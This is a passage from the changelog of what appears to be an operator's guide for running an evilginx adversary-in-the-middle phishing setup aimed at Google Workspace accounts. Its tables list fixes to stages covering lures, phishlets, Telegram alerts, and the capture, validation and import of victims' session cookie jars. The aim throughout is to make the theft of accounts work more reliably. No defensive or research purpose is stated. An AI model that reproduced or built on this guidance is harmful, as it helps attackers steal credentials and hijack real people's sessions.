| 9 | 8j dispatch-contract check | `s.dispatch undefined` at build after a bad `input.go` |
| 10 | 25f typing test, mandatory | shipping a lure nobody can correct |
| 11 | `docker ps` no longer uses `RestartCount` | `can't evaluate field RestartCount` |
| 12 | Stage 6a tmux mouse mode | being unable to scroll up and copy |
| 13 | "Go and YAML are not shell commands" rule, plus `syntax error near unexpected token` row | pasting `func` and `healthcheck:` at a prompt |
| 14 | Stage 0 gate raised from 13 to 20 checks | a stale clone passing silently |
| 15 | Troubleshooting sections for chrome start-up and typing | the two areas that actually failed |

## What changed in v24, and why

| # | Change | Error it prevents |
|:--|:--|:--|
| 1 | Stage 32 chrome table says `set --` must be `4`, not `3` | chasing a false failure at 15b |
| 2 | 26e uses `-sSL -A "$UA"` and no longer calls a bare `301`/`302` stale | a good jar thrown away |
| 3 | 26a selects the session by phishlet name, not `[0]` | importing the wrong account's jar |
| 4 | 26f and 25e accept 14–18 cookies | an `18` count read as a failure |
| 5 | Stage 0 notes the `debug: true` interaction with Stage 34 | a false Stage 0 failure |
| 6 | Stage 34 lists the two things that look like breakage and are not | `blacklist` and `debug` false positives |
| 7 | Stage 34 smoke test reads the filesystem, not the log | no proof at all once debug is off |
| 8 | 8e no longer runs `docker compose config` twice | noise |

## What changed in v25, and why

| # | Change | Error it prevents |
|:--|:--|:--|
| 1 | Fixed the broken bold marker in 6b | the `sessions should be nested` row rendering as raw text |
| 2 | Fixed the broken bold markers in 23e | the `script` and `login.domain` failures rendering as raw text |
| 3 | 12b now stops the container **before** editing `config.json` | evilginx rewriting the file on shutdown and silently reverting the ports |
| 4 | `python3-yaml` and `openssl` installed at Stage 6, not Stage 22 | `validate_gsuite.py` failing with `ModuleNotFoundError` at 8k |
| 5 | 8k gains a `bindings` under 12 row and a restore command | a gutted script passing on a lucky count |
| 6 | Stage 7 gains the credentials prompt fix | a private repo leaving the reader at a `Username:` prompt with no table entry |
| 7 | Stage 29 says to attach first | `config telegram test` typed into the host shell |
| 8 | Stage 31 un-chains `tmux new` from `docker attach` | `&&` aborting the attach on `duplicate session` |
| 9 | 28b gains the revert command instead of prose | the reader stuck with `REWRITE_URLS=true` after a `404` |
| 10 | 34 smoke test uses `ls -1t` instead of `[0]` | an old capture passing as the new one |
| 11 | 34 states the expected output of the three proofs and points at the table first | `403` misread as a fault |
| 12 | 20g "At `:`:" reworded to "Wait for `:`, then" | a garbled instruction |
| 13 | New "If this is your first time" section, and a plain definition of what finished looks like | a first-time reader with no mental model of the goal |
```
